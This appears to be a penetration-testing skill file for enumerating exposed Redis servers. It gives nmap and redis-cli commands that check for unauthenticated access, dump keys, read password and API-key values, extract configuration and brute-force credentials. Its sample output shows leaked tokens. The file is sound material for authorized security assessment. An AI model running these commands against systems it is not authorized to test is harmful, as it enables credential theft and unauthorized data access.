---
name: db-redis-enum
description: Redis enumeration for unauthorized access, key discovery, config extraction, and sandbox detection
version: 1.0.0
phase: enum
category: database
tags: [database, redis, cache]
tools: [nmap, redis-cli]
difficulty: basic
opsec_level: medium
time_estimate: 30s
severity_if_found: high
related_skills:
  - db-mongodb-enum
  - docker-api
mitre_attack:
  - T1213
  - T1046
---

## When to Use

Use this skill when port 6379 (Redis) is open and you want to check for
unauthorized access, extract keys, discover configuration, and detect
potential sandbox escape via CONFIG SET.

## Prerequisites

- nmap (for service detection)
- redis-cli (Redis client)

## Procedure

```bash
# Step 1: Service detection
nmap -sV -p 6379 TARGET --script redis-info

# Step 2: Test unauthorized access
redis-cli -h TARGET -p 6379 PING
redis-cli -h TARGET -p 6379 INFO server

# Step 3: Enumerate keyspaces
redis-cli -h TARGET -p 6379 INFO keyspace
redis-cli -h TARGET -p 6379 DBSIZE

# Step 4: Dump all keys (iterate over DBs)
redis-cli -h TARGET -p 6379 KEYS '*'
redis-cli -h TARGET -p 6379 --scan --pattern '*' | head -50

# Step 5: Get values from discovered keys
redis-cli -h TARGET -p 6379 GET 'password'
redis-cli -h TARGET -p 6379 GET 'secret'
redis-cli -h TARGET -p 6379 GET 'api_key'

# Step 6: Extract configuration
redis-cli -h TARGET -p 6379 CONFIG GET *
redis-cli -h TARGET -p 6379 CONFIG GET requirepass
redis-cli -h TARGET -p 6379 CONFIG GET dir
redis-cli -h TARGET -p 6379 CONFIG GET dbfilename

# Step 7: Check for sandbox escape (CONFIG SET + SAVE)
redis-cli -h TARGET -p 6379 CONFIG GET slave-read-only

# Step 8: nmap NSE scripts
nmap -sV -p 6379 TARGET --script redis-brute
```

## OPSEC Rules

- Do NOT FLUSHALL, DEL, or modify any keys
- Do NOT CONFIG SET (unless authorized for sandbox escape test)
- Do NOT SLAVEOF (replication is intrusive)
- Read key values only — do not write or overwrite
- Log all commands for audit trail

## Verification

- Confirm Redis version and accessible port
- Verify keys and values are readable
- Check if requirepass is set (empty = unauthorized access)

## Pitfalls

- Redis may be on port 6380 (TLS) or custom ports
- KEYS * blocks the DB on production instances with many keys
- CONFIG settings may be restricted by `rename-command CONFIG`
- Some deployments bind to localhost only

## Output Format

```
[REDIS]   Host: TARGET:6379 — version: 7.2.0
[REDIS]   Auth: None — unauthorized access confirmed
[REDIS]   Keys: 142 keys across 1 DB
[KEY]     session:admin — value: eyJhbGciOiJIUzI1NiJ9...
[KEY]     config:api_key — value: sk_live_3f8a...
[KEY]     app:password — value: admin123
[CONFIG]  dir: /var/lib/redis — dbfilename: dump.rdb
[CRITICAL] Unauthenticated Redis — all keys readable, possible sandbox escape
```
